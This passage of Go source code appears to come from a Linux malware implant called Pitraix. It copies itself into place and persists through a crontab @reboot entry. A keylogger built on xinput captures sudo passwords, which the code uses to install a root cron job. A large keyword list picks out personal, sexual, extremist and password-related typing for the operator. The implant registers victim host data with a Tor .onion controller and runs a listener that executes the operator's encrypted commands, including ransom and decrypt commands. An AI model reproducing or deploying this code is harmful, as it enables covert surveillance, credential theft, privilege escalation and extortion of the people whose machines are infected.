	tor_FolderName, _ := predictable_random(config_FilePath + "@fPRISZBSTCCLEVANER~3" + username + cpu + cpuVendor + userHomeDIR, 0, true)
	if len(tor_FolderName) > 30 {
		tor_FolderName = tor_FolderName[:25]
	}
	tor_FolderName = "." + tor_FolderName

	tor_FolderPath = "/home/" + username + "/.local/share"

	// tor_FolderPath

	var cft config_File_Type

	// Good enough but could use some improvement of sorts
	// rdmod.Seed(int64(bytesumbig([]byte(username + userHomeDIR + cpu + cpuVendor + "XDLOLHA"))))
	// k1 := random_Bytes(32, true) // ??

	rdmod.Seed(int64(bytesumbig([]byte(userHomeDIR + cpu + "VOWLLA" + userHomeDIR + username ))))
	locAES_Key = random_Bytes(32, false)

	rdmod.Seed(int64(bytesumbig([]byte(cpu + cpuVendor + userHomeDIR + "LHREWDHITOEAHEAR" + username))))

	torPort := strconv.Itoa(rdmod.Intn(6999 - 3000) + 3000)	
	

	// firstTime, _ := cft.updateConf(k1, cft.AES_Key, contactDate) //, username, cpu, cpuVendor, userHomeDIR)
	firstTime = !file_Exists(pitraix_FilePath)

	// fmt.Println("torPort:", torPort)
	// fmt.Println("firstTime:", firstTime)
	// fmt.Println("isroot_const:", isroot_const)

	if firstTime == true {
		// srcFile, _ := os.Open(currentPath)
		// destFile, _ := os.Create(pitraix_FilePath)
		// destFile_2, _ := os.Create(pitraix_spreadPath)
		copyf(currentPath, pitraix_FilePath)
		// copyf(currentPath, pitraix_spreadPath)

		// time.Sleep(time.Second * 5)
		if isroot_const {

			// fmt.Println("admin!", out)
		} else {
			// fmt.Println("no :(", out)
		}
	}


	firstTime = !file_Exists(config_FilePath)
	if firstTime {
		AES_Key = random_Bytes(32, true)
		cft.AES_Key = base64.StdEncoding.EncodeToString(AES_Key)
		cft.ContactD = contactDate
		cft.Logs = map[string][]string{"1": {"firstTime", "Created config file ", contactDate}}
		cft.Events = map[string][]string{"1": {"firstTime", "Opened implant", contactDate}}
		cft.Modules = map[string][]string{"0": {}}
		cft.RegTmp  = []string{}
		cft.RoutesH = []string{}
		cft.Register = false

		out, _ := json.Marshal(cft)
		pl_encrypted, pl_nonce, _ := encrypt_AES(out, locAES_Key)
		f, _ := os.Create(config_FilePath)
		f.WriteString(base64.StdEncoding.EncodeToString(pl_encrypted) + "|" + base64.StdEncoding.EncodeToString(pl_nonce))
		f.Close()
		// if err != nil {
		// 	fmt.Println("Error creating config file!", config_FilePath, err)
		// }


		// pl_encoded := fmt.Sprintf("%s|%s", base64.StdEncoding.EncodeToString(pl_encrypted), base64.StdEncoding.EncodeToString(pl_nonce))
		// f.WriteString(pl_encoded)
		// f.Close()
		// // confAsyncChn <- fmt.Sprintf("aes|%s", key_encoded)
		// // confAsyncChn <- fmt.Sprintf("contactd|%s", contactDate)
		// // fmt.Println(cft.AES_Key, cft.ContactD)
		// fmt.Println("Created config file!")	
	
		// cft.AES_Key = AES_Key
		// cft.ContactD = contactD
	}
	cft.updateConf("fetch", []string{})

	go confUpdaterAsync()

	/*
		PERSISTENCE
		if first time, it would attempt to persist temporary to /tmp and privilege 
		escalate by keylogging and monitoring for "sudo .." then 
		copying self to more permanent location
	*/
	if firstTime == true { // temporary persistence
		doInstru("shell", fmt.Sprintf("cp %s %s", "lyst", pitraix_FilePath))
		doInstru("shell", fmt.Sprintf(`echo "@reboot %s" | crontab -`, pitraix_FilePath))
		fmt.Println("temporary persisted", pitraix_FilePath)
	}

	var ipinfo_struct ipInfo
	for {
		ipinfo_req, err := getRequest("https://ipinfo.io/json", false, 10)
		if err != nil {
			fmt.Println(ipinfo_req, err)
			time.Sleep(time.Second * 5)
			continue
		}
		json.Unmarshal(ipinfo_req, &ipinfo_struct)
		break

	}

	if ipinfo_struct.Country == "IL" {
		fmt.Println("Shalom")
		os.Exit(0) // I love you
	}


	hstAddress := setupTor(tor_FolderPath, torPort, tor_FolderName, &ipinfo_struct, false)
	fmt.Println("Address", hstAddress)

	opPubEncryptionKeyProcessed, err := ParseRsaPublicKeyFromPemStr(raw_OPEncryptionKeyPEM) // x509.ParsePKIXPublicKey(pemDec(raw_OPEncryptionKeyPEM).Bytes) // x509.ParsePKCS1PublicKey(pemDec(raw_OPEncryptionKeyPEM).Bytes)
	// opPubSigningKeyProcessed   , _ := x509.ParsePKCS1PublicKey(pemDec(raw_OPSigningKeyPEM).Bytes)


	// if opPubSigningKeyProcessed == opPubEncryptionKeyProcessed {
	// 	log("WARNING", "OPER signing key is same as encryption key! this is highly recommended against")
	// }
	
	

	klogChn1 := make(chan string)

	// Move both parser and raw before attempt
	go func(klogChn1 chan string) { // Key logger parser
		sudoTrigger := false

		/* 
			Some words of this list are mispelled on purpose, this is not a mistake and logger will still pick correct word
			This list will only keylog "interesting" things like porn searches, extremeist views and personal information
		*/
		eventsIndicators := []string{
			"going to",
			"will",
			"troll",
			"vpn",
			"proxy",
			"password",
			"hid",
			"tor",
			"hack",
			"crack",
			"engineer",
			"spam",
			"log",
			"i2p",
			"freenet",
			"whonix",
			"qube",
			"tails",
			"usb",
			"dox",
			"opsec",
			"info",
			"sell",
			"buy",
			"ubuntu",
			"debian",
			"manjaro",
			"arch",
			"fedora",
			"harden",
			"bot",
			"mal",
			"data",
			"dev",
			"psyop",
			"op",
			"vacation",
			"program",
			"python",
			"c++",
			"c#",
			"binary",
			"java",
			"javascript",
			"golang",
			"html",
			"css",
			"cypher",
			"cipher",
			"zero",
			"0",
			"1",
			"2",
			"3",
			"4",
			"5",
			"6",
			"7",
			"8",
			"9",
			"exploit",
			"meta",
			"fuc",
			"shi",
			"se",
			"dic",
			"coc",
			"pus",
			"as",
			"ti",
			"bal",
			"youn",
			"ki",
			"tee",
			"chil",
			"fullz",
			"cp",
			"por",
			"x",
			"tra",
			"gay",
			"lgb",
			"blow",
			"rap",
			"stalk",
			"horny",
			"naked",
			"hard",
			"soft",
			"bre",
			"straight",
			"girl",
			"fur",
			"cub",
			"prostitut",
			"mom",
			"mother",
			"dad",
			"father",
			"sis",
			"brother",
			"sibling",
			"uncle",
			"aunt",
			"cousin",
			"al qaeda",
			"isi",
			"islamic",
			"ji",
			"muslim",
			"naz",
			"hitl",
			"ww1",
			"ww2",
			"ww3",
			"ww4",
			"www.",
			"world",
			"would",
			"white",
			"black",
			"je",
			"nig",
			"neg",
			"war",
			"revenge",
			"grudge",
			"blood",
			"fa",
			"hate",
			"iraq",
			"syria",
			"flight",
			"plan",
			"drone",
			"nuclear",
			"nuke",
			"bom",
			"explos",
			"sho",
			"guns",
			"glock",
			"pistol",
			"rifle",
			"suicid",
			"weapon",
			"kill",
			"pathetic",
			"weak",
			"strong",
			"crew",
			"border",
			"customs",
			"discord",
			"virus",
			"chemical",
			"pro",
			"betray",
			"how to",
			"manual",
			"facebook",
			"twitter",
			"link",
			"youtube",
			"google",
			"duckduckgo",
			"resume",
			"website",
			"blog",
			"site",
			"game",
			"admin",
			"mod",
			"onion",
			"monero",
			"bitcoin",
			"ether",
			"crypt",
			"encrypt",
			"sign",
			"decrypt",
			"coin",
			"byte",
			"bit",
			"mixer",
			"amd",
			"intel",
			"nvidia",
			"linux",
			"problem",
			"windows",
			"unix",
			"bsd",
			"assembly",
			"card",
			"visit",
			"email",
			"slack",
			"irc",
			"jabber",
			"xmpp",
			"matrix",
			"element",
			"client",
			"user",
			"blackmail",
			"dark",
			"deep",
			"cyber",
			"privacy",
			"security",
			"learn",
			"teach",
			"var",
			"scam",
			"http",
			"bought",
			"spread",
			"profile",
			"nord",
			"express",
			"firefox",
			"chrome",
			"nsa",
			"national",
			"agency",
			"fbi",
			"addict",
			"fed",
			"cia",
			"mossad",
			"office",
			"agent",
			"operat",
			"officer",
			"bank",
			"money",
			"cash",
			"credit",
			"debt",
			"social",
			"cop",
			"spy",
			"deploy",
			"military",
			"sector",
			"lake city",
			"quiet pill",
			"spooks",
			"jail",
			"prison",
			"torture",
			"homeland",
			"motherland",
			"goverment",
			"work",
			"job",
			"poor",
			"rich",
			"wealthy",
			"welfare",
			"shin",
			"bnd",
			"dod",
			"meeting",
			"schedule",
			"heading to",
			"van",
			"car",
			"boat",
			"charge",
			"drug",
			"date",
			"meth",
			"tramadol",
			"weed",
			"cig",
			"alcohol",
			"xanax",
			"mushroom",
			"heroin",
			"tar",
			"fentanyl",
			"coke",
			"cocaine",
			"mdma",
			"marijuana",
			"oxycodone",
			"morphine",
			"steroid",
			"overdose",
			"angel",
			"depress",
			"homework",
			"friend",
			"age",
			"name",
			"location",
			"country",
			"city",
			"live",
			"from",
			"israel",
			"iran",
			"egypt",
			"tired",
			"europe",
			"latin",
			"old",
			"america",
			"north",
			"south",
			"africa",
			"east",
			"asia",
			"arab",
			"american",
			"african",
			"food",
			"closed",
			"cook",
			"cancer",
			"german",
			"moving",			
			"study",
			"college",
			"school",
			"daycare",
			"sleep",
			"slept",
			"bed",
			"love",
			"like",
			"dislike",
			"scared",
			"scary",
			"terrifying",
			"anime",
			"cartoon",
			"devil",
			"satan",
			"god",
			"hell",
			"heaven",
			"tiktok",
			"android",
			"iphone",
			"open",
			"dog",
			"cat",
			"noob",
			"soccer",
			"baseball",
			"basketball",
			"virign",
			"i am",
			"i'm",
			"im",
			"name",
			"nick",
			"wife",
			"house",
			"home",
			"apartment",
			"garage",
			"door",
			"paid",
			"pay",
			"dollar",
			"euro",
			"free",
			"holy",
		}
		
		for sentence := range klogChn1 {
			if sudoTrigger == false {
				sentenceSplit := strings.Split(strings.TrimSpace(sentence), " ")
				if !isroot_const && (sentenceSplit[0] == "sudo" || sentenceSplit[0] == "doas") {
					fmt.Println("sudo command detected:", sentence)
					sudoTrigger = true
				} else {
					words := strings.Fields(sentence)
					match := false
					for _, w := range words {
						if match {
							break
						}
						for _, w2 := range eventsIndicators {
							if strings.HasPrefix(strings.ToLower(w), w2) || strings.HasPrefix(strings.ToLower(sentence), w2){ // contains strings start
								fmt.Println("word match!", w)
								match = true
								break
							}
						}
					}

					if match == true {
						fmt.Println("keylog event match:", sentence)
						event("keylog", sentence)
					} else {
						fmt.Println("uninteresting:", sentence)
					}
					// fmt.Println("got sentence:", sentence, sentenceSplit, len(sentenceSplit))
				}
			} else {
				if !strings.Contains(sentence, "<AU>") && !strings.Contains(sentence, "<AD>") && !strings.Contains(sentence, "<AR>") && !strings.Contains(sentence, "<AL>") {
					// fmt.Println("Password:", sentence)
					out := doInstru("shell", "echo " + sentence +" | sudo -S bash -c \"echo @reboot " + pitraix_FilePath + " > /var/spool/cron/crontabs/root\"") // \"echo \"@reboot " + pitraix_FilePath +"\" | crontab -\"")
					if !strings.Contains(out, "incorrect password attempt") {
						// fmt.Println("holy poop we are root!11", out)
						doInstru("shell", "crontab -r")
						// fmt.Println(out)
					} else {
						fmt.Println("invalid pass: ", out)
					}
					sudoTrigger = false
				} else {
					fmt.Println("invalid pass:", sentence)
				}
			}
		}
	}(klogChn1)

	go func(klogChn1 chan string) { // Key logger raw
		keybCodes := map[string]string{
			"36": "ENTER",
			"66": "CAPS",
			"22": "BACKSPACE",
			"19": "0",
			"10": "1",
			"11": "2",
			"12": "3",
			"13": "4",
			"14": "5",
			"15": "6",
			"16": "7",
			"17": "8",
			"18": "9",
			"38": "a",
			"56": "b",
			"54": "c",
			"40": "d",
			"26": "e",
			"41": "f",
			"42": "g",
			"43": "h",
			"31": "i",
			"44": "j",
			"45": "k",
			"46": "l",
			"58": "m",
			"57": "n",
			"32": "o",
			"33": "p",
			"24": "q",
			"27": "r",
			"39": "s",
			"28": "t",
			"30": "u",
			"55": "v",
			"25": "w",
			"53": "x",
			"29": "y",
			"52": "z",
			"65": " ",
			"20": "-",
			"21": "=",
			"61": "/",
			"51": "\\",
			"49": "`",
			"59": ",",
			"60": ".",
			"48": "'",
			"47": ";",
			"82": "-",
			"86": "+",
			"106": "/",
			"91": ".",
			"111": "<AU>",
			"116": "<AD>",
			"114": "<AR>",
			"113": "<AL>",
		}

		// keybCodes_Special := map[string]string{
		// 	"21": "+",
		// 	"82": "_",
		// 	"19": ")",
		// 	"10": "!",
		// 	"11": "@",
		// 	"12": "#",
		// 	"49": "~",
		// 	"13": "$",
		// 	"14": "%",
		// 	"15": "^",
		// 	"16": "&",
		// 	"17": "*",
		// 	"18": "(",
		// 	"48": "\"",
		// 	"47": ":",
		// 	"60": ">",
		// 	"59": "<",
		// 	"61": "?",
		// }

		/* 
			We need to enforce X11 in session first
			We also need to get right keyboard
		*/
		args := "test 11"
		cmd := exec.Command("xinput", strings.Split(args, " ")...)

		stdout, _ := cmd.StdoutPipe()
		cmd.Start()

		scanner := bufio.NewScanner(stdout)
		// scanner.Split(bufio.ScanWords)

		var sentence string
		var capsLock bool

		for scanner.Scan() {
			line := scanner.Text()
			// fmt.Println("Aho", line)
			if strings.HasPrefix(line, "key press") {
				// fmt.Println(keybCodes[strings.TrimSpace(line[9:])])
				char := keybCodes[strings.TrimSpace(line[9:])]

				switch (char) {
				case "ENTER":
					klogChn1 <- sentence
					// fmt.Println(sentence)
					sentence = ""
				case "CAPS":
					capsLock = !capsLock

				case "BACKSPACE":
					if len(sentence) > 0 {
						sentence = sentence[:len(sentence) - 1]
					}
				default:
					if capsLock == false {
						sentence += char
					} else {
						sentence += strings.ToUpper(char)
					}
				}
			}
		}
		cmd.Wait()
	}(klogChn1)

	// first time register logic
	fmt.Println("oo ma gawd", err)
	encryptedMessage_register := RSA_OAEP_Encrypt(AES_Key, *opPubEncryptionKeyProcessed)
	encrypted_registerData, nonce, _ := encrypt_AES([]byte(fmt.Sprintf(`{"Address": "%s", "Username": "%s", "CPU": "%s", "RAM": "%s", "IP": "%s", "Country": "%s", "City": "%s", "Hostname": "%s", "Chassis": %d, "OS": %d, "OSVar": "%s", "Kernel": "%s", "Arch": %d, "Vendor": "%s", "Model": "%s", "ContactD": "%s", "RasKey": "%s"}`, hstAddress, username, cpu, memory, ipinfo_struct.IP, ipinfo_struct.Country, ipinfo_struct.City, userHostname, machineType, osName, osVariant, kernelVersion, arch, machineVendor, machineModel, contactDate, base64.StdEncoding.EncodeToString(random_Bytes(32, true)))), AES_Key)
	registerData := fmt.Sprintf("%s|%s|%s", encryptedMessage_register, base64.StdEncoding.EncodeToString(encrypted_registerData), base64.StdEncoding.EncodeToString(nonce))

	fmt.Println(agentAddress)
	for {
		fmt.Println("firstTime:", firstTime, "cft.Register:", cft.Register)
		if firstTime == false && cft.Register == true {
			fmt.Println("stopped")
			break
		}
		
		// log("Register", "Attempting to register with Agent: " + agentAddress)
		fmt.Println("Attempting to register with Agent", agentAddress + ".onion")
		response, err := postRequest("http://" + agentAddress + ".onion", []byte(registerData), true, 25)	 
		if err != nil {
			log("Register", "Error") // + err.Error())
			fmt.Println("Error contacting Agent to register. ", err)
			time.Sleep(2 * time.Second) // DEBUG Increase to 2-9 seconds via randomizer later
		} else {
			fmt.Println("Respone: ", string(response), err)

			if string(response) == "1" {
				cft.updateConf("register", []string{"true"})
				// confAsyncChn <- []string{"register", "true"}
				firstTime = false
				// time.Sleep(5 * time.Second)
			}
			// cft.updateConf(locAES_Key, cft.AES_Key, cft.ContactD) //, username, cpu, cpuVendor, userHomeDIR)
			
		}
	}
	
	// normal cell setup
	log("Cell", "Setting up cell")
	fmt.Println("Setting up cell")
	
	var antiddosCounter int = 0

	go func(antiddosCounter *int) {
		for {
			if *antiddosCounter == 0 {
				time.Sleep(1 * time.Second)
			} else {
				time.Sleep(5 * time.Second)
				*antiddosCounter = *antiddosCounter - 5
			}
		}
	}(&antiddosCounter)

	http.HandleFunc("/", func(writer http.ResponseWriter, req *http.Request) {
		req.Body = http.MaxBytesReader(writer, req.Body, 3000) // if anything wrong, its prolly dis bitch
		if req.Method == "GET" {
			log("Foreign - GET", "Received GET request")
			fmt.Println("Got GET request! ", req.Body)
		}else if req.Method == "POST" {
			reqBody, _ := ioutil.ReadAll(req.Body)
			if len(reqBody) > 0 && isASCII(string(reqBody)) {
				dataSlice := strings.Split(string(reqBody), "|")
				fmt.Println(dataSlice)
				if len(dataSlice) == 3 { // register
					if antiddosCounter == 0 {
						antiddosCounter = ddosCounter
						confAsyncChn <- []string{"regtmp", string(reqBody)}
						io.WriteString(writer, "1")
					} else {
						fmt.Println("anti ddos caught something", antiddosCounter, dataSlice)
						go log("Foreign - POST", "anti ddos caught something! DataSlice: " + dataSlice[0] + "|" + dataSlice[1] + "|" + dataSlice[2])
					}
				} else if len(dataSlice) == 2 { // instrctuion
					temp_decipher, _ := base64.StdEncoding.DecodeString(dataSlice[0])
					temp_nonce   , _ := base64.StdEncoding.DecodeString(dataSlice[1])
					fmt.Println(temp_decipher, temp_nonce) // , base64.StdEncoding.EncodeToString(cft.AES_Key))
					if len(temp_nonce) != 12 {
						go log("Foreign - POST", "Invalid nonce length: " + strconv.Itoa(len(temp_nonce)) + ". DataSlice: " + dataSlice[0] + " " + dataSlice[1])
						fmt.Println("Invalid nonce length given!", len(temp_nonce), temp_nonce)
					} else {
						decipher, err := decrypt_AES(temp_decipher, temp_nonce, AES_Key)
						if err != nil {
							go log("Foreign - POST", "Error while decrypting cipher! DataSlice: " + dataSlice[0] + "|" + dataSlice[1] + "|" + dataSlice[2])
						} else {
							var instructions = []string{} // instruType
							err := json.Unmarshal(decipher, &instructions)
							if err != nil {
								go log("Foreign - POST", "Error while unmarshalling! DataSlice: " + dataSlice[0] + "|" + dataSlice[1] + "|" + dataSlice[2])
							} else {
								var shouldLog bool = true
								var final_output string
								for index, instru := range instructions {
									fmt.Println("INSTRUCTION:", index, instru)
									instru_split := strings.Split(instru, " ")
									if len(instru_split) == 0 {
										fmt.Println("wtf?", index, instru)
										go log("Foreign - POST", "Received ZERO INSTRUCTIONS: " + string(decipher))
									} else {
										if instru_split[0] == "ransom" || instru_split[0] == "decrypt" {
											shouldLog = false
										}
										final_output += strings.TrimSpace(doInstru(instru_split[0], instru[len(instru_split[0]) + 1:])) + " <PiTrIaXMaGGi$N$9a1n>"
									}
								}
								if shouldLog == true{
									go log("Foreign - POST", "Received instructions: " + string(decipher))
								}
								fmt.Println("Received instructions:",err, len(instructions), string(decipher))

								final_output = strings.TrimSpace(final_output) // [:len(final_output) - 2]
								output_enc, nonce_enc, _ := encrypt_AES([]byte(final_output), AES_Key)
								output_encode := fmt.Sprintf("%s|%s", base64.StdEncoding.EncodeToString(output_enc), base64.StdEncoding.EncodeToString(nonce_enc))
								io.WriteString(writer, output_encode)
							}
						}
					}
				} else {
					go log("Foreign - POST", "Received POST request without data length 2: " + strconv.Itoa(len(dataSlice)))
					// fmt.Println("Got POST request without DataSlice 2! ", dataSlice, len(dataSlice))
				}
			} else {
				go log("Foreign - POST", "Received POST request without valid data: " + string(reqBody))
				fmt.Println("Got POST request without valid data! %v %v\n", reqBody, string(reqBody))
			}	
		} else {
			fmt.Println("Hello Fake", req.Method)
		}
	})
	fmt.Println(http.ListenAndServe("127.0.0.1:6969", nil))
}

func ParseRsaPublicKeyFromPemStr(pubPEM string) (*rsa.PublicKey, error) {
    block, _ := pem.Decode([]byte(pubPEM))
    if block == nil {
		return nil, errors.New("failed to parse PEM")
    }

    pub, err := x509.ParsePKIXPublicKey(block.Bytes)
    if err != nil {
        return nil, err
    }

    switch pub := pub.(type) {
    case *rsa.PublicKey:
        return pub, nil
    default:
         break
    }
    return nil, errors.New("key is not RSA")
}

func tor_running_check() bool {
	ports := []string{"9050"} // , "9150"}
	tor_running := true
	for _, port := range ports {
		conn, err := net.DialTimeout("tcp", "127.0.0.1:" + port, time.Second)
		if err != nil {
			tor_running = false
		}
		if conn != nil {
			tor_running = true
			conn.Close()
			break
		}
	}
	return tor_running
}

func postRequest(target_url string, data []byte, useTor bool, timeout time.Duration) ([]byte, error) {
	client := &http.Client{}
	if timeout != -1 {
		client = &http.Client{
			Timeout: time.Second * timeout,
		}
	}

	if useTor == true {
		torTransport := &http.Transport{Dial: tbDialer.Dial}
		client = &http.Client{
			Transport: torTransport,
			Timeout: time.Second * timeout,
		}
	}

	req, _ := http.NewRequest("POST", target_url, bytes.NewBuffer(data))
	req.Header.Set("user-agent", "Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0")

	resp, err := client.Do(req)
	if err != nil {
		return []byte{}, err
	}

	defer resp.Body.Close()
	
	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return []byte{}, err
	}

	return body, nil
}

func getRequest(target_url string, useTor bool, timeout time.Duration) ([]byte, error) {
	client := &http.Client{}
	if timeout != -1 {
		client = &http.Client{
			Timeout: time.Second * timeout,
		}
	}

	if useTor == true {
		torTransport := &http.Transport{Dial: tbDialer.Dial}
		client = &http.Client{
			Transport: torTransport,
			Timeout: time.Second * timeout,
		}
	}
	
	req, _ := http.NewRequest("GET", target_url, nil)
	req.Header.Set("user-agent", "Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0")

	resp, err := client.Do(req)
	if err != nil {
		return []byte{}, err
	}

	defer resp.Body.Close()
	
	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return []byte{}, err
	}

	return body, nil
}

func decrypt_AES(cipher_Text []byte, nonce []byte, key []byte) ([]byte, error) {
	cphr, err := aes.NewCipher(key)
	if err != nil {
		return []byte{}, err
	}
	gcm, err := cipher.NewGCM(cphr)
	if err != nil {
		return []byte{}, err
	}

	decrypted_Cipher, err := gcm.Open(nil, nonce, cipher_Text, nil)
	if err != nil {
		return []byte{}, err
	}

	return decrypted_Cipher, nil
}

func encrypt_AES(text []byte, key []byte) ([]byte, []byte, error) {
	cphr, err := aes.NewCipher(key)
	if err != nil {
		return []byte{}, []byte{}, err
	}
	gcm, err := cipher.NewGCM(cphr)
	if err != nil {
		return []byte{}, []byte{}, err
	}
	nonce := make([]byte, gcm.NonceSize())
	rand.Read(nonce)

	return gcm.Seal(nil, nonce, text, nil), nonce, nil
}

func create_signature(msg []byte, privateKey rsa.PrivateKey) ([]byte, []byte, error) {
	msgHash := sha512.New()
	_, err := msgHash.Write(msg)
	if err != nil {
		return []byte{}, []byte{}, err
	}
	msgHashSum := msgHash.Sum(nil)
	signature, err := rsa.SignPSS(rand.Reader, &privateKey, crypto.SHA512, msgHashSum, nil)
	if err != nil {
		return []byte{}, []byte{}, err
	}
	
	return signature, msgHashSum, nil
}

func verify_signature(publicKey rsa.PublicKey, msgHashSum []byte, signature []byte) error {
	err := rsa.VerifyPSS(&publicKey, crypto.SHA512, msgHashSum, signature, nil)
	if err != nil {
		return err
	}

	return nil
}

func RSA_OAEP_Encrypt(secretMessage []byte, publicKey rsa.PublicKey) string {
    rng := rand.Reader
    ciphertext, err := rsa.EncryptOAEP(sha512.New(), rng, &publicKey, secretMessage, nil)
	if err != nil {
        fmt.Println(err)
    }
    return base64.StdEncoding.EncodeToString(ciphertext)
}
 
func RSA_OAEP_Decrypt(cipherText string, privateKey rsa.PrivateKey) []byte {
    ct, _ := base64.StdEncoding.DecodeString(cipherText)
    rng := rand.Reader
    plaintext, err := rsa.DecryptOAEP(sha512.New(), rng, &privateKey, ct, nil)
    if err != nil {
        fmt.Println(err)
    }
    return plaintext
}

func random_Bytes(l int, t bool) []byte {
	b := make([]byte, l)
	if t == true { // secure rand
		rand.Read(b)
	} else {
		rdmod.Read(b)
	}

	return b
}

func file_Exists(filePath string) bool {
	_, err := os.Stat(filePath)
	return !os.IsNotExist(err)
}

func inFindStr(a string, list []string) bool {
    for _, b := range list {
        if b == a {
            return true
        }
    }
    return false
}
